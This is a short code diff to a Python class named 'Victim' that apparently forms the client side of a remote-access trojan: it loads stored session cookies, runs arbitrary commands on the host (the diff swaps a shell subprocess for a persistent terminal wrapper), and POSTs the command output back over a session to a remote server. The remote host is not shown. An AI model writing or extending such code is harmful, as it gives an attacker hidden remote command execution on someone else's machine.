@@ -4,8 +4,13 @@ import pickle
 import time
 import subprocess
 
+from prompt import Prompt
+
 class Victim:
     DEBUG = True
+
+    def __init__(self):
+        self.__term = Prompt()
 
     # Try to load session cookies from file
     def __tryToLoadSessionCookies(self):
@@ -51,12 +56,8 @@ class Victim:
 
     # Execute command
     def executeCommand(self, command):
-        output = subprocess.Popen(command,
-                            shell=True,
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.PIPE,
-                            stdin=subprocess.PIPE )
-        return str(output.stdout.read(), 'utf-8') + str(output.stderr.read(), 'utf-8')
+        self.__term.write(command)
+        return self.__term.readStdout() + self.__term.readStderr()
 
     def sendCommandOutput(self, output):
         return self.__session.request('POST',
